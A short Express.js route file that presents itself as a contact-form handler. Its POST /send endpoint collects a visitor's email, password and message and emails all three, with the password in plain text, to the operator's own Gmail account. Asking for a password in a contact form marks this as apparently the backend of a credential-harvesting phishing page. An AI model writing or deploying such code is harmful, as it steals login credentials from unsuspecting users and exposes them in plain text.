import express from 'express';
import nodemailer from 'nodemailer';

const router = express.Router();

// Configure Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: 'gmail', // You can use other email services
  auth: {
    user: process.env.EMAIL_USER, // Email address from which to send
    pass: process.env.EMAIL_PASS, // Email password or app-specific password
  },
});

router.post('/send', async (req, res) => {
  const { email, password, message } = req.body;

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_USER, // Replace with your email address
    subject: 'New Contact Form Submission',
    text: `Email: ${email}\nPassword: ${password}\nMessage: ${message}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send('Email sent successfully');
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).send('Error sending email');
  }
});

export default router;
